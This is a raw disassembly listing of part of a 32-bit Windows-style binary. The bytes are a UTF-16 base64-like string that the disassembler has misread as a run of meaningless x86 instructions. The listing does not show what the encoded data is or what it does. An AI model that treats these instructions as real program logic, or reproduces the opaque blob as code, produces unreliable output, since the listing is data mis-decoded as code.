  40ac58:	49                   	dec    %ecx
  40ac59:	00 51 00             	add    %dl,0x0(%ecx)
  40ac5c:	75 00                	jne    0x40ac5e
  40ac5e:	68 00 4e 00 4f       	push   $0x4f004e00
  40ac63:	00 67 00             	add    %ah,0x0(%edi)
  40ac66:	52                   	push   %edx
  40ac67:	00 35 00 7a 00 4e    	add    %dh,0x4e007a00
  40ac6d:	00 4e 00             	add    %cl,0x0(%esi)
  40ac70:	4d                   	dec    %ebp
  40ac71:	00 6e 00             	add    %ch,0x0(%esi)
  40ac74:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac75:	00 36                	add    %dh,(%esi)
  40ac77:	00 42 00             	add    %al,0x0(%edx)
  40ac7a:	4c                   	dec    %esp
  40ac7b:	00 56 00             	add    %dl,0x0(%esi)
  40ac7e:	53                   	push   %ebx
  40ac7f:	00 78 00             	add    %bh,0x0(%eax)
  40ac82:	5a                   	pop    %edx
  40ac83:	00 62 00             	add    %ah,0x0(%edx)
  40ac86:	35 00 78 00 79       	xor    $0x79007800,%eax
  40ac8b:	00 70 00             	add    %dh,0x0(%eax)
  40ac8e:	59                   	pop    %ecx
  40ac8f:	00 39                	add    %bh,(%ecx)
  40ac91:	00 4f 00             	add    %cl,0x0(%edi)
  40ac94:	44                   	inc    %esp
  40ac95:	00 55 00             	add    %dl,0x0(%ebp)
  40ac98:	4b                   	dec    %ebx
  40ac99:	00 57 00             	add    %dl,0x0(%edi)
  40ac9c:	57                   	push   %edi
  40ac9d:	00 77 00             	add    %dh,0x0(%edi)
  40aca0:	52                   	push   %edx
  40aca1:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  40aca5:	00 41 00             	add    %al,0x0(%ecx)
  40aca8:	31 00                	xor    %eax,(%eax)
  40acaa:	6a 00                	push   $0x0
  40acac:	53                   	push   %ebx
  40acad:	00 4b 00             	add    %cl,0x0(%ebx)
  40acb0:	30 00                	xor    %al,(%eax)
  40acb2:	30 00                	xor    %al,(%eax)
  40acb4:	6e                   	outsb  %ds:(%esi),(%dx)
  40acb5:	00 43 00             	add    %al,0x0(%ebx)
  40acb8:	53                   	push   %ebx
  40acb9:	00 52 00             	add    %dl,0x0(%edx)
  40acbc:	43                   	inc    %ebx
  40acbd:	00 69 00             	add    %ch,0x0(%ecx)
  40acc0:	78 00                	js     0x40acc2
  40acc2:	63 00                	arpl   %eax,(%eax)
  40acc4:	61                   	popa
  40acc5:	00 73 00             	add    %dh,0x0(%ebx)
  40acc8:	4e                   	dec    %esi
  40acc9:	00 31                	add    %dh,(%ecx)
  40accb:	00 79 00             	add    %bh,0x0(%ecx)
  40acce:	36 00 43 00          	add    %al,%ss:0x0(%ebx)
  40acd2:	7a 00                	jp     0x40acd4
  40acd4:	46                   	inc    %esi
  40acd5:	00 30                	add    %dh,(%eax)
  40acd7:	00 65 00             	add    %ah,0x0(%ebp)
  40acda:	72 00                	jb     0x40acdc
  40acdc:	6e                   	outsb  %ds:(%esi),(%dx)
  40acdd:	00 66 00             	add    %ah,0x0(%esi)
  40ace0:	70 00                	jo     0x40ace2
  40ace2:	73 00                	jae    0x40ace4
  40ace4:	6c                   	insb   (%dx),%es:(%edi)
  40ace5:	00 30                	add    %dh,(%eax)
  40ace7:	00 42 00             	add    %al,0x0(%edx)
  40acea:	57                   	push   %edi
  40aceb:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  40acef:	00 6f 00             	add    %ch,0x0(%edi)
  40acf2:	38 00                	cmp    %al,(%eax)
  40acf4:	72 00                	jb     0x40acf6
  40acf6:	42                   	inc    %edx
  40acf7:	00 43 00             	add    %al,0x0(%ebx)
  40acfa:	44                   	inc    %esp
  40acfb:	00 58 00             	add    %bl,0x0(%eax)
  40acfe:	32 00                	xor    (%eax),%al
  40ad00:	73 00                	jae    0x40ad02
  40ad02:	68 00 4f 00 67       	push   $0x67004f00
  40ad07:	00 48 00             	add    %cl,0x0(%eax)
  40ad0a:	45                   	inc    %ebp
  40ad0b:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40ad0f:	00 66 00             	add    %ah,0x0(%esi)
  40ad12:	44                   	inc    %esp
  40ad13:	00 37                	add    %dh,(%edi)
  40ad15:	00 33                	add    %dh,(%ebx)
  40ad17:	00 39                	add    %bh,(%ecx)
  40ad19:	00 63 00             	add    %ah,0x0(%ebx)
  40ad1c:	49                   	dec    %ecx
  40ad1d:	00 55 00             	add    %dl,0x0(%ebp)
  40ad20:	34 00                	xor    $0x0,%al
  40ad22:	42                   	inc    %edx
  40ad23:	00 73 00             	add    %dh,0x0(%ebx)
  40ad26:	35 00 5a 00 51       	xor    $0x51005a00,%eax
  40ad2b:	00 41 00             	add    %al,0x0(%ecx)
  40ad2e:	74 00                	je     0x40ad30
  40ad30:	46                   	inc    %esi
  40ad31:	00 51 00             	add    %dl,0x0(%ecx)
  40ad34:	43                   	inc    %ebx
  40ad35:	00 4f 00             	add    %cl,0x0(%edi)
  40ad38:	31 00                	xor    %eax,(%eax)
  40ad3a:	2f                   	das
  40ad3b:	00 2b                	add    %ch,(%ebx)
  40ad3d:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  40ad41:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40ad45:	00 30                	add    %dh,(%eax)
  40ad47:	00 48 00             	add    %cl,0x0(%eax)
  40ad4a:	48                   	dec    %eax
  40ad4b:	00 4e 00             	add    %cl,0x0(%esi)
  40ad4e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad4f:	00 57 00             	add    %dl,0x0(%edi)
  40ad52:	62 00                	bound  %eax,(%eax)
  40ad54:	5a                   	pop    %edx
  40ad55:	00 2f                	add    %ch,(%edi)
  40ad57:	00 75 00             	add    %dh,0x0(%ebp)
  40ad5a:	50                   	push   %eax
  40ad5b:	00 37                	add    %dh,(%edi)
  40ad5d:	00 5a 00             	add    %bl,0x0(%edx)
  40ad60:	69 00 64 00 4b 00    	imul   $0x4b0064,(%eax),%eax
  40ad66:	6a 00                	push   $0x0
  40ad68:	31 00                	xor    %eax,(%eax)
  40ad6a:	43                   	inc    %ebx
  40ad6b:	00 4e 00             	add    %cl,0x0(%esi)
  40ad6e:	77 00                	ja     0x40ad70
  40ad70:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40ad74:	71 00                	jno    0x40ad76
  40ad76:	51                   	push   %ecx
  40ad77:	00 46 00             	add    %al,0x0(%esi)
  40ad7a:	71 00                	jno    0x40ad7c
  40ad7c:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad7d:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40ad81:	00 6a 00             	add    %ch,0x0(%edx)
  40ad84:	2b 00                	sub    (%eax),%eax
  40ad86:	4f                   	dec    %edi
  40ad87:	00 54 00 67          	add    %dl,0x67(%eax,%eax,1)
  40ad8b:	00 41 00             	add    %al,0x0(%ecx)
  40ad8e:	31 00                	xor    %eax,(%eax)
  40ad90:	67 00 54 00          	add    %dl,0x0(%si)
  40ad94:	76 00                	jbe    0x40ad96
  40ad96:	34 00                	xor    $0x0,%al
  40ad98:	63 00                	arpl   %eax,(%eax)
  40ad9a:	51                   	push   %ecx
  40ad9b:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40ad9f:	00 52 00             	add    %dl,0x0(%edx)
  40ada2:	51                   	push   %ecx
  40ada3:	00 42 00             	add    %al,0x0(%edx)
  40ada6:	69 00 6c 00 30 00    	imul   $0x30006c,(%eax),%eax
  40adac:	2f                   	das
  40adad:	00 51 00             	add    %dl,0x0(%ecx)
  40adb0:	48                   	dec    %eax
  40adb1:	00 32                	add    %dh,(%edx)
  40adb3:	00 70 00             	add    %dh,0x0(%eax)
  40adb6:	69 00 78 00 53 00    	imul   $0x530078,(%eax),%eax
  40adbc:	77 00                	ja     0x40adbe
  40adbe:	63 00                	arpl   %eax,(%eax)
  40adc0:	35 00 44 00 6c       	xor    $0x6c004400,%eax
  40adc5:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40adc9:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40adcd:	00 78 00             	add    %bh,0x0(%eax)
  40add0:	58                   	pop    %eax
  40add1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40add4:	6c                   	insb   (%dx),%es:(%edi)
  40add5:	00 6a 00             	add    %ch,0x0(%edx)
  40add8:	52                   	push   %edx
  40add9:	00 41 00             	add    %al,0x0(%ecx)
  40addc:	4a                   	dec    %edx
  40addd:	00 51 00             	add    %dl,0x0(%ecx)
  40ade0:	34 00                	xor    $0x0,%al
  40ade2:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40ade6:	57                   	push   %edi
  40ade7:	00 55 00             	add    %dl,0x0(%ebp)
  40adea:	6c                   	insb   (%dx),%es:(%edi)
  40adeb:	00 6d 00             	add    %ch,0x0(%ebp)
  40adee:	34 00                	xor    $0x0,%al
  40adf0:	42                   	inc    %edx
  40adf1:	00 32                	add    %dh,(%edx)
  40adf3:	00 73 00             	add    %dh,0x0(%ebx)
  40adf6:	61                   	popa
  40adf7:	00 5a 00             	add    %bl,0x0(%edx)
  40adfa:	4b                   	dec    %ebx
  40adfb:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40adff:	00 75 00             	add    %dh,0x0(%ebp)
  40ae02:	4e                   	dec    %esi
  40ae03:	00 51 00             	add    %dl,0x0(%ecx)
  40ae06:	4e                   	dec    %esi
  40ae07:	00 79 00             	add    %bh,0x0(%ecx)
  40ae0a:	4e                   	dec    %esi
  40ae0b:	00 6e 00             	add    %ch,0x0(%esi)
  40ae0e:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40ae12:	44                   	inc    %esp
  40ae13:	00 2b                	add    %ch,(%ebx)
  40ae15:	00 52 00             	add    %dl,0x0(%edx)
  40ae18:	35 00 63 00 68       	xor    $0x68006300,%eax
  40ae1d:	00 59 00             	add    %bl,0x0(%ecx)
  40ae20:	62 00                	bound  %eax,(%eax)
  40ae22:	31 00                	xor    %eax,(%eax)
  40ae24:	6a 00                	push   $0x0
  40ae26:	44                   	inc    %esp
  40ae27:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40ae2b:	00 77 00             	add    %dh,0x0(%edi)
  40ae2e:	56                   	push   %esi
  40ae2f:	00 49 00             	add    %cl,0x0(%ecx)
  40ae32:	43                   	inc    %ebx
  40ae33:	00 56 00             	add    %dl,0x0(%esi)
  40ae36:	48                   	dec    %eax
  40ae37:	00 43 00             	add    %al,0x0(%ebx)
  40ae3a:	70 00                	jo     0x40ae3c
  40ae3c:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40ae40:	77 00                	ja     0x40ae42
  40ae42:	6d                   	insl   (%dx),%es:(%edi)
  40ae43:	00 41 00             	add    %al,0x0(%ecx)
  40ae46:	4f                   	dec    %edi
  40ae47:	00 68 00             	add    %ch,0x0(%eax)
  40ae4a:	71 00                	jno    0x40ae4c
  40ae4c:	35 00 54 00 43       	xor    $0x43005400,%eax
  40ae51:	00 4e 00             	add    %cl,0x0(%esi)
  40ae54:	57                   	push   %edi
  40ae55:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40ae59:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40ae5d:	00 79 00             	add    %bh,0x0(%ecx)
  40ae60:	53                   	push   %ebx
  40ae61:	00 50 00             	add    %dl,0x0(%eax)
  40ae64:	37                   	aaa
  40ae65:	00 76 00             	add    %dh,0x0(%esi)
  40ae68:	6a 00                	push   $0x0
  40ae6a:	4a                   	dec    %edx
  40ae6b:	00 52 00             	add    %dl,0x0(%edx)
  40ae6e:	35 00 63 00 68       	xor    $0x68006300,%eax
  40ae73:	00 30                	add    %dh,(%eax)
  40ae75:	00 63 00             	add    %ah,0x0(%ebx)
  40ae78:	46                   	inc    %esi
  40ae79:	00 35 00 70 00 54    	add    %dh,0x54007000
  40ae7f:	00 39                	add    %bh,(%ecx)
  40ae81:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae84:	4f                   	dec    %edi
  40ae85:	00 49 00             	add    %cl,0x0(%ecx)
  40ae88:	38 00                	cmp    %al,(%eax)
  40ae8a:	51                   	push   %ecx
  40ae8b:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
  40ae8f:	00 47 00             	add    %al,0x0(%edi)
  40ae92:	7a 00                	jp     0x40ae94
  40ae94:	42                   	inc    %edx
  40ae95:	00 32                	add    %dh,(%edx)
  40ae97:	00 30                	add    %dh,(%eax)
  40ae99:	00 2f                	add    %ch,(%edi)
  40ae9b:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40ae9f:	00 61 00             	add    %ah,0x0(%ecx)
  40aea2:	4b                   	dec    %ebx
  40aea3:	00 67 00             	add    %ah,0x0(%edi)
  40aea6:	57                   	push   %edi
  40aea7:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40aeab:	00 72 00             	add    %dh,0x0(%edx)
  40aeae:	68 00 33 00 46       	push   $0x46003300
  40aeb3:	00 6a 00             	add    %ch,0x0(%edx)
  40aeb6:	59                   	pop    %ecx
  40aeb7:	00 56 00             	add    %dl,0x0(%esi)
  40aeba:	4d                   	dec    %ebp
  40aebb:	00 4d 00             	add    %cl,0x0(%ebp)
  40aebe:	37                   	aaa
  40aebf:	00 6b 00             	add    %ch,0x0(%ebx)
  40aec2:	32 00                	xor    (%eax),%al
  40aec4:	2f                   	das
  40aec5:	00 7a 00             	add    %bh,0x0(%edx)
  40aec8:	39 00                	cmp    %eax,(%eax)
  40aeca:	7a 00                	jp     0x40aecc
  40aecc:	53                   	push   %ebx
  40aecd:	00 50 00             	add    %dl,0x0(%eax)
  40aed0:	4a                   	dec    %edx
  40aed1:	00 78 00             	add    %bh,0x0(%eax)
  40aed4:	75 00                	jne    0x40aed6
  40aed6:	54                   	push   %esp
  40aed7:	00 45 00             	add    %al,0x0(%ebp)
  40aeda:	46                   	inc    %esi
  40aedb:	00 35 00 34 00 61    	add    %dh,0x61003400
  40aee1:	00 71 00             	add    %dh,0x0(%ecx)
  40aee4:	4d                   	dec    %ebp
  40aee5:	00 48 00             	add    %cl,0x0(%eax)
  40aee8:	7a 00                	jp     0x40aeea
  40aeea:	75 00                	jne    0x40aeec
  40aeec:	63 00                	arpl   %eax,(%eax)
  40aeee:	47                   	inc    %edi
  40aeef:	00 7a 00             	add    %bh,0x0(%edx)
  40aef2:	61                   	popa
  40aef3:	00 66 00             	add    %ah,0x0(%esi)
  40aef6:	4d                   	dec    %ebp
  40aef7:	00 4b 00             	add    %cl,0x0(%ebx)
  40aefa:	42                   	inc    %edx
  40aefb:	00 5a 00             	add    %bl,0x0(%edx)
  40aefe:	6c                   	insb   (%dx),%es:(%edi)
  40aeff:	00 42 00             	add    %al,0x0(%edx)
  40af02:	31 00                	xor    %eax,(%eax)
  40af04:	42                   	inc    %edx
  40af05:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40af09:	00 48 00             	add    %cl,0x0(%eax)
  40af0c:	2f                   	das
  40af0d:	00 33                	add    %dh,(%ebx)
  40af0f:	00 78 00             	add    %bh,0x0(%eax)
  40af12:	4e                   	dec    %esi
  40af13:	00 71 00             	add    %dh,0x0(%ecx)
  40af16:	68 00 72 00 51       	push   $0x51007200
  40af1b:	00 30                	add    %dh,(%eax)
  40af1d:	00 46 00             	add    %al,0x0(%esi)
  40af20:	53                   	push   %ebx
  40af21:	00 6f 00             	add    %ch,0x0(%edi)
  40af24:	61                   	popa
  40af25:	00 43 00             	add    %al,0x0(%ebx)
  40af28:	6f                   	outsl  %ds:(%esi),(%dx)
  40af29:	00 49 00             	add    %cl,0x0(%ecx)
  40af2c:	7a 00                	jp     0x40af2e
  40af2e:	69 00 56 00 42 00    	imul   $0x420056,(%eax),%eax
  40af34:	37                   	aaa
  40af35:	00 62 00             	add    %ah,0x0(%edx)
  40af38:	6e                   	outsb  %ds:(%esi),(%dx)
  40af39:	00 6d 00             	add    %ch,0x0(%ebp)
  40af3c:	78 00                	js     0x40af3e
  40af3e:	56                   	push   %esi
  40af3f:	00 73 00             	add    %dh,0x0(%ebx)
  40af42:	77 00                	ja     0x40af44
  40af44:	5a                   	pop    %edx
  40af45:	00 38                	add    %bh,(%eax)
  40af47:	00 68 00             	add    %ch,0x0(%eax)
  40af4a:	52                   	push   %edx
  40af4b:	00 30                	add    %dh,(%eax)
  40af4d:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40af51:	00 39                	add    %bh,(%ecx)
  40af53:	00 45 00             	add    %al,0x0(%ebp)
  40af56:	68 00 31 00 6d       	push   $0x6d003100
  40af5b:	00 78 00             	add    %bh,0x0(%eax)
  40af5e:	55                   	push   %ebp
  40af5f:	00 59 00             	add    %bl,0x0(%ecx)
  40af62:	68 00 4b 00 73       	push   $0x73004b00
  40af67:	00 79 00             	add    %bh,0x0(%ecx)
  40af6a:	34 00                	xor    $0x0,%al
  40af6c:	72 00                	jb     0x40af6e
  40af6e:	59                   	pop    %ecx
  40af6f:	00 53 00             	add    %dl,0x0(%ebx)
  40af72:	31 00                	xor    %eax,(%eax)
  40af74:	37                   	aaa
  40af75:	00 7a 00             	add    %bh,0x0(%edx)
  40af78:	71 00                	jno    0x40af7a
  40af7a:	6b 00 33             	imul   $0x33,(%eax),%eax
  40af7d:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  40af81:	00 4f 00             	add    %cl,0x0(%edi)
  40af84:	30 00                	xor    %al,(%eax)
  40af86:	75 00                	jne    0x40af88
  40af88:	59                   	pop    %ecx
  40af89:	00 79 00             	add    %bh,0x0(%ecx)
  40af8c:	59                   	pop    %ecx
  40af8d:	00 70 00             	add    %dh,0x0(%eax)
  40af90:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40af94:	54                   	push   %esp
  40af95:	00 4a 00             	add    %cl,0x0(%edx)
  40af98:	4d                   	dec    %ebp
  40af99:	00 6b 00             	add    %ch,0x0(%ebx)
  40af9c:	68 00 67 00 51       	push   $0x51006700
  40afa1:	00 36                	add    %dh,(%esi)
  40afa3:	00 6a 00             	add    %ch,0x0(%edx)
  40afa6:	2f                   	das
  40afa7:	00 37                	add    %dh,(%edi)
  40afa9:	00 43 00             	add    %al,0x0(%ebx)
  40afac:	4e                   	dec    %esi
  40afad:	00 67 00             	add    %ah,0x0(%edi)
  40afb0:	45                   	inc    %ebp
  40afb1:	00 69 00             	add    %ch,0x0(%ecx)
  40afb4:	38 00                	cmp    %al,(%eax)
  40afb6:	57                   	push   %edi
  40afb7:	00 58 00             	add    %bl,0x0(%eax)
  40afba:	34 00                	xor    $0x0,%al
  40afbc:	53                   	push   %ebx
  40afbd:	00 42 00             	add    %al,0x0(%edx)
  40afc0:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40afc4:	49                   	dec    %ecx
  40afc5:	00 39                	add    %bh,(%ecx)
  40afc7:	00 35 00 4d 00 6e    	add    %dh,0x6e004d00
  40afcd:	00 36                	add    %dh,(%esi)
  40afcf:	00 77 00             	add    %dh,0x0(%edi)
  40afd2:	76 00                	jbe    0x40afd4
  40afd4:	68 00 4b 00 67       	push   $0x67004b00
  40afd9:	00 4e 00             	add    %cl,0x0(%esi)
  40afdc:	2b 00                	sub    (%eax),%eax
  40afde:	68 00 36 00 68       	push   $0x68003600
  40afe3:	00 75 00             	add    %dh,0x0(%ebp)
  40afe6:	6c                   	insb   (%dx),%es:(%edi)
  40afe7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40afea:	72 00                	jb     0x40afec
  40afec:	6a 00                	push   $0x0
  40afee:	41                   	inc    %ecx
  40afef:	00 30                	add    %dh,(%eax)
  40aff1:	00 7a 00             	add    %bh,0x0(%edx)
  40aff4:	45                   	inc    %ebp
  40aff5:	00 30                	add    %dh,(%eax)
  40aff7:	00 75 00             	add    %dh,0x0(%ebp)
  40affa:	5a                   	pop    %edx
  40affb:	00 5a 00             	add    %bl,0x0(%edx)
  40affe:	46                   	inc    %esi
  40afff:	00 7a 00             	add    %bh,0x0(%edx)
  40b002:	75 00                	jne    0x40b004
  40b004:	35 00 33 00 49       	xor    $0x49003300,%eax
  40b009:	00 76 00             	add    %dh,0x0(%esi)
  40b00c:	54                   	push   %esp
  40b00d:	00 58 00             	add    %bl,0x0(%eax)
  40b010:	6e                   	outsb  %ds:(%esi),(%dx)
  40b011:	00 6b 00             	add    %ch,0x0(%ebx)
  40b014:	50                   	push   %eax
  40b015:	00 39                	add    %bh,(%ecx)
  40b017:	00 7a 00             	add    %bh,0x0(%edx)
  40b01a:	77 00                	ja     0x40b01c
  40b01c:	63 00                	arpl   %eax,(%eax)
  40b01e:	31 00                	xor    %eax,(%eax)
  40b020:	34 00                	xor    $0x0,%al
  40b022:	2b 00                	sub    (%eax),%eax
  40b024:	6f                   	outsl  %ds:(%esi),(%dx)
  40b025:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b029:	00 67 00             	add    %ah,0x0(%edi)
  40b02c:	76 00                	jbe    0x40b02e
  40b02e:	4c                   	dec    %esp
  40b02f:	00 56 00             	add    %dl,0x0(%esi)
  40b032:	51                   	push   %ecx
  40b033:	00 63 00             	add    %ah,0x0(%ebx)
  40b036:	6b 00 67             	imul   $0x67,(%eax),%eax
  40b039:	00 62 00             	add    %ah,0x0(%edx)
  40b03c:	74 00                	je     0x40b03e
  40b03e:	54                   	push   %esp
  40b03f:	00 7a 00             	add    %bh,0x0(%edx)
  40b042:	33 00                	xor    (%eax),%eax
  40b044:	79 00                	jns    0x40b046
  40b046:	6a 00                	push   $0x0
  40b048:	54                   	push   %esp
  40b049:	00 7a 00             	add    %bh,0x0(%edx)
  40b04c:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40b050:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40b054:	77 00                	ja     0x40b056
  40b056:	37                   	aaa
  40b057:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b05a:	44                   	inc    %esp
  40b05b:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40b05f:	00 32                	add    %dh,(%edx)
  40b061:	00 76 00             	add    %dh,0x0(%esi)
  40b064:	2f                   	das
  40b065:	00 76 00             	add    %dh,0x0(%esi)
  40b068:	51                   	push   %ecx
  40b069:	00 4e 00             	add    %cl,0x0(%esi)
  40b06c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b06d:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b071:	00 6b 00             	add    %ch,0x0(%ebx)
  40b074:	63 00                	arpl   %eax,(%eax)
  40b076:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40b07a:	32 00                	xor    (%eax),%al
  40b07c:	52                   	push   %edx
  40b07d:	00 38                	add    %bh,(%eax)
  40b07f:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40b083:	00 55 00             	add    %dl,0x0(%ebp)
  40b086:	73 00                	jae    0x40b088
  40b088:	58                   	pop    %eax
  40b089:	00 36                	add    %dh,(%esi)
  40b08b:	00 70 00             	add    %dh,0x0(%eax)
  40b08e:	6c                   	insb   (%dx),%es:(%edi)
  40b08f:	00 4d 00             	add    %cl,0x0(%ebp)
  40b092:	33 00                	xor    (%eax),%eax
  40b094:	63 00                	arpl   %eax,(%eax)
  40b096:	6e                   	outsb  %ds:(%esi),(%dx)
  40b097:	00 6d 00             	add    %ch,0x0(%ebp)
  40b09a:	73 00                	jae    0x40b09c
  40b09c:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b0a0:	2b 00                	sub    (%eax),%eax
  40b0a2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0a3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b0a6:	31 00                	xor    %eax,(%eax)
  40b0a8:	77 00                	ja     0x40b0aa
  40b0aa:	70 00                	jo     0x40b0ac
  40b0ac:	63 00                	arpl   %eax,(%eax)
  40b0ae:	43                   	inc    %ebx
  40b0af:	00 6b 00             	add    %ch,0x0(%ebx)
  40b0b2:	4c                   	dec    %esp
  40b0b3:	00 52 00             	add    %dl,0x0(%edx)
  40b0b6:	31 00                	xor    %eax,(%eax)
  40b0b8:	62 00                	bound  %eax,(%eax)
  40b0ba:	58                   	pop    %eax
  40b0bb:	00 58 00             	add    %bl,0x0(%eax)
  40b0be:	7a 00                	jp     0x40b0c0
  40b0c0:	66 00 38             	data16 add %bh,(%eax)
  40b0c3:	00 66 00             	add    %ah,0x0(%esi)
  40b0c6:	72 00                	jb     0x40b0c8
  40b0c8:	2f                   	das
  40b0c9:	00 79 00             	add    %bh,0x0(%ecx)
  40b0cc:	75 00                	jne    0x40b0ce
  40b0ce:	33 00                	xor    (%eax),%eax
  40b0d0:	59                   	pop    %ecx
  40b0d1:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0d4:	78 00                	js     0x40b0d6
  40b0d6:	73 00                	jae    0x40b0d8
  40b0d8:	6d                   	insl   (%dx),%es:(%edi)
  40b0d9:	00 2b                	add    %ch,(%ebx)
  40b0db:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b0de:	48                   	dec    %eax
  40b0df:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40b0e3:	00 73 00             	add    %dh,0x0(%ebx)
  40b0e6:	35 00 6a 00 2f       	xor    $0x2f006a00,%eax
  40b0eb:	00 5a 00             	add    %bl,0x0(%edx)
  40b0ee:	31 00                	xor    %eax,(%eax)
  40b0f0:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40b0f4:	6c                   	insb   (%dx),%es:(%edi)
  40b0f5:	00 35 00 39 00 61    	add    %dh,0x61003900
  40b0fb:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40b0ff:	00 69 00             	add    %ch,0x0(%ecx)
  40b102:	64 00 32             	add    %dh,%fs:(%edx)
  40b105:	00 51 00             	add    %dl,0x0(%ecx)
  40b108:	53                   	push   %ebx
  40b109:	00 39                	add    %bh,(%ecx)
  40b10b:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40b10f:	00 53 00             	add    %dl,0x0(%ebx)
  40b112:	79 00                	jns    0x40b114
  40b114:	48                   	dec    %eax
  40b115:	00 62 00             	add    %ah,0x0(%edx)
  40b118:	52                   	push   %edx
  40b119:	00 65 00             	add    %ah,0x0(%ebp)
  40b11c:	5a                   	pop    %edx
  40b11d:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40b121:	00 2b                	add    %ch,(%ebx)
  40b123:	00 68 00             	add    %ch,0x0(%eax)
  40b126:	73 00                	jae    0x40b128
  40b128:	39 00                	cmp    %eax,(%eax)
  40b12a:	56                   	push   %esi
  40b12b:	00 59 00             	add    %bl,0x0(%ecx)
  40b12e:	51                   	push   %ecx
  40b12f:	00 67 00             	add    %ah,0x0(%edi)
  40b132:	43                   	inc    %ebx
  40b133:	00 59 00             	add    %bl,0x0(%ecx)
  40b136:	4e                   	dec    %esi
  40b137:	00 76 00             	add    %dh,0x0(%esi)
  40b13a:	50                   	push   %eax
  40b13b:	00 4e 00             	add    %cl,0x0(%esi)
  40b13e:	51                   	push   %ecx
  40b13f:	00 73 00             	add    %dh,0x0(%ebx)
  40b142:	45                   	inc    %ebp
  40b143:	00 73 00             	add    %dh,0x0(%ebx)
  40b146:	53                   	push   %ebx
  40b147:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b14a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b14b:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40b14f:	00 71 00             	add    %dh,0x0(%ecx)
  40b152:	34 00                	xor    $0x0,%al
  40b154:	7a 00                	jp     0x40b156
  40b156:	7a 00                	jp     0x40b158
  40b158:	36 00 38             	add    %bh,%ss:(%eax)
  40b15b:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40b15f:	00 33                	add    %dh,(%ebx)
  40b161:	00 4f 00             	add    %cl,0x0(%edi)
  40b164:	53                   	push   %ebx
  40b165:	00 75 00             	add    %dh,0x0(%ebp)
  40b168:	2b 00                	sub    (%eax),%eax
  40b16a:	50                   	push   %eax
  40b16b:	00 69 00             	add    %ch,0x0(%ecx)
  40b16e:	41                   	inc    %ecx
  40b16f:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  40b173:	00 59 00             	add    %bl,0x0(%ecx)
  40b176:	66 00 54 00 71       	data16 add %dl,0x71(%eax,%eax,1)
  40b17b:	00 41 00             	add    %al,0x0(%ecx)
  40b17e:	69 00 65 00 72 00    	imul   $0x720065,(%eax),%eax
  40b184:	63 00                	arpl   %eax,(%eax)
  40b186:	64 00 35 00 62 00 63 	add    %dh,%fs:0x63006200
  40b18d:	00 51 00             	add    %dl,0x0(%ecx)
  40b190:	6a 00                	push   $0x0
  40b192:	4f                   	dec    %edi
  40b193:	00 4d 00             	add    %cl,0x0(%ebp)
  40b196:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40b19a:	69 00 45 00 4f 00    	imul   $0x4f0045,(%eax),%eax
  40b1a0:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1a1:	00 48 00             	add    %cl,0x0(%eax)
  40b1a4:	67 00 77 00          	add    %dh,0x0(%bx)
  40b1a8:	34 00                	xor    $0x0,%al
  40b1aa:	41                   	inc    %ecx
  40b1ab:	00 52 00             	add    %dl,0x0(%edx)
  40b1ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1af:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40b1b3:	00 39                	add    %bh,(%ecx)
  40b1b5:	00 7a 00             	add    %bh,0x0(%edx)
  40b1b8:	54                   	push   %esp
